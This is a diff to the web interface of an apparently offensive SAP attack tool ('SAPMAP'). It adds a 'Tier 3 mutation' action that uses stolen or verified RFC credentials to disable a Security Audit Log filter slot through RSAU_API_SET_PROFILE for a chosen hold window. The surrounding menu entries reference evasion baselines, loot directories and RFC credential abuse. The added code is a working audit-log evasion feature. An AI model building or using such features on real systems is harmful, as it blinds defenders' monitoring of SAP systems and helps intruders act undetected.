@@ -932,6 +932,7 @@ body {
       <div class="ctx-item" data-action="capture_evasion_baseline">&#128190; Capture Evasion Baseline (Tier 3 pre-flight)</div>
       <div class="ctx-item" data-action="probe_rsau_api">&#128270; Probe RSAU API Surface (Tier 3 discovery)</div>
       <div class="ctx-item" data-action="probe_rsau_dyn_profile">&#128270; Probe RSAU Dynamic Profile (Tier 3 discovery)</div>
+      <div class="ctx-item" data-action="tier3_sal_slot_disable">&#9889; Disable SAL Slot... (Tier 3 mutation)</div>
       <div class="ctx-item" data-action="retrieve_rfcs">&#128225; Retrieve RFC Connections</div>
       <div class="ctx-item" data-action="read_java_destinations">&#128225; Read Java JCo Destinations</div>
       <div class="ctx-item" data-action="test_rfcs">&#129514; Test RFC Connections</div>
@@ -4074,6 +4075,9 @@ function showCtxMenu(e, sid) {
         && !!(mapState.evasion && mapState.evasion.allow_evasion),
     'probe_rsau_dyn_profile': hasUsableAbapAccess
         && !!(mapState.evasion && mapState.evasion.allow_evasion),
+    'tier3_sal_slot_disable': hasUsableAbapAccess
+        && !!(mapState.evasion && mapState.evasion.allow_evasion)
+        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
     'retrieve_rfcs':    hasUsableAbapAccess,        // ABAP-only RFC + BAPI
     'test_rfcs':        hasUsableAbapAccess && hasRFCs,
     'read_java_destinations': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
@@ -4271,6 +4275,12 @@ function showCtxMenu(e, sid) {
         ((mapState.evasion && mapState.evasion.allow_evasion)
          ? 'Needs a verified RFC credential — calls RSAU_API_GET_PROFILE(ID_NAME=$DYN$, ID_DYN_CONF=X) and dumps the verbatim ET_FILT / ET_FILTEX / ET_TEXT / ET_LOG rows to loot/baseline/<SID>/dyn_profile_<ts>.json. Pure read; no mutation. Tells us the actual RSAUPROF row field set on this kernel so the Phase 3 writer can construct IT_FILT correctly.'
          : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
+    'tier3_sal_slot_disable':
+        ((mapState.evasion && mapState.evasion.allow_evasion && mapState.evasion.baseline_captured_at)
+         ? 'MUTATES kernel state. Flips STATUS=X→\' \' on one SAL filter slot via RSAU_API_SET_PROFILE(ID_UPD_DYN_CNF=X, ID_SET_ACTIV=\' \') — dynamic in-memory only, no profile file write. Holds the slot disabled for N seconds (operator picks), then auto-restores the baseline ET_FILT/ET_FILTEX/ET_TEXT via the evasion_window context. Watch SM19 / RSAU_CONFIG during the hold to verify the slot is genuinely inactive on the server.'
+         : ((mapState.evasion && mapState.evasion.allow_evasion)
+            ? 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.'
+            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
     'retrieve_rfcs':    'Needs a verified RFC credential or a SAPMAP-created user — RSRFCCHK and the RFCDES read both require a working logon.',
     'test_rfcs':        (!hasRFCs
         ? 'Retrieve RFC connections first.'
@@ -4369,6 +4379,7 @@ function showCtxMenu(e, sid) {
     'capture_evasion_baseline': !isAbapStack,
     'probe_rsau_api': !isAbapStack,
     'probe_rsau_dyn_profile': !isAbapStack,
+    'tier3_sal_slot_disable': !isAbapStack,
     'retrieve_rfcs':    !isAbapStack,
     'test_rfcs':        !isAbapStack,
     'create_tcpip':          !isAbapStack,
@@ -5470,6 +5481,42 @@ async function ctxAction(action) {
     case 'probe_rsau_dyn_profile':
       flashActivity(`${sid}: probing RSAU dynamic profile`, 5000);
       await api('POST', `node/${sid}/probe_rsau_dyn_profile`); break;
+    case 'tier3_sal_slot_disable': {
+      const slotno = prompt(
+        'Tier 3: disable which SAL filter slot on ' + sid + '?\n\n'
+        + 'Enter slot number (e.g. 1 or 0001). '
+        + 'The slot will be flipped to STATUS=\' \' for the hold '
+        + 'window, then auto-restored.', '1');
+      if (!slotno) break;
+      const holdRaw = prompt(
+        'Hold disabled for how many seconds before auto-restore?\n\n'
+        + 'Watch SM19 / RSAU_CONFIG on the server during this '
+        + 'window — the slot should show inactive.', '5');
+      if (!holdRaw) break;
+      const hold = parseFloat(holdRaw);
+      if (isNaN(hold) || hold < 0 || hold > 600) {
+        showToast('Hold seconds must be a number between 0 and 600',
+                   'warning');
+        break;
+      }
+      if (!confirm(
+        'RUN Tier 3 SAL slot disable on ' + sid + '?\n\n'
+        + 'Slot: ' + slotno + '\n'
+        + 'Hold: ' + hold + 's\n\n'
+        + 'This MUTATES kernel state — a baseline must already be '
+        + 'captured for restore-on-exit to work.\n\n'
+        + 'After the hold window expires, SAPMAP will automatically '
+        + 'restore the baseline ET_FILT/ET_FILTEX/ET_TEXT rows via '
+        + 'RSAU_API_SET_PROFILE. The kernel may still record the '
+        + 'mutation in its own change tracking — verify on the '
+        + 'server before relying on this for live ops.')) break;
+      flashActivity(
+        `${sid}: Tier 3 — disabling SAL slot ${slotno} for ${hold}s`,
+        Math.max(10000, (hold + 5) * 1000));
+      await api('POST', `node/${sid}/tier3_sal_slot_disable`,
+                 {slotno: slotno, hold_seconds: hold});
+      break;
+    }
     case 'retrieve_rfcs':
       await api('POST', `node/${sid}/retrieve_rfcs`); break;
     case 'test_rfcs':
